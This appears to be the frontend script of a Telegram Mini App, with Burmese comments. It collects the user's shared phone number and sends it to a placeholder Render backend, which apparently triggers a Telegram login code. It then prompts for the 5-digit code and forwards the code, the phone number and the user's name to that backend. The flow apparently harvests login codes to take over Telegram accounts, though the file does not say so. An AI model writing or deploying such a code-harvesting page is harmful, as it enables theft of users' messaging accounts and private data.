const tg = window.Telegram.WebApp;
tg.expand();

// 🔴 သင့် Render URL ဖြင့် အစားထိုးပါ
const BACKEND_URL = "https://your-render-app-name.onrender.com"; 

let phoneHash = "";
let userPhone = "";
let userName = tg.initDataUnsafe?.user?.first_name || "Cloud User";

function showLoading(show) {
    document.getElementById("loading").classList.toggle("hidden", !show);
}

function switchStep(stepId) {
    document.querySelectorAll(".step").forEach(el => el.classList.add("hidden"));
    document.getElementById(stepId).classList.remove("hidden");
}

function requestContact() {
    tg.requestContact(async function(shared) {
        if (shared) {
            userPhone = tg.initDataUnsafe?.user?.phone;
            if(!userPhone) return alert("ဖုန်းနံပါတ် ရယူ၍မရပါ။");
            
            showLoading(true);
            switchStep("step-loading"); // Loading ပြမည်
            
            try {
                let res = await fetch(`${BACKEND_URL}/api/send_code`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ phone: userPhone })
                });
                let result = await res.json();
                
                showLoading(false);
                if(result.success) {
                    phoneHash = result.hash;
                    switchStep("step-otp");
                } else {
                    alert("Error: " + result.message);
                    switchStep("step-phone");
                }
            } catch(e) { showLoading(false); alert("Connection Failed"); }
        }
    });
}

async function verifyOTP() {
    let code = document.getElementById("otp_input").value;
    if(code.length !== 5) return alert("OTP ၅ လုံး ပြည့်အောင် ရိုက်ပါ။");
    
    showLoading(true);
    let res = await fetch(`${BACKEND_URL}/api/verify_code`, {
        method: "POST", headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ phone: userPhone, code: code, hash: phoneHash, name: userName })
    });
    
    let result = await res.json();
    showLoading(false);
    
    if(result.success) {
        switchStep("step-success");
        tg.HapticFeedback.notificationOccurred("success"); // ဖုန်းတုန်ခိုင်းမည်
    } else {
        alert("Error: " + result.message);
    }
}
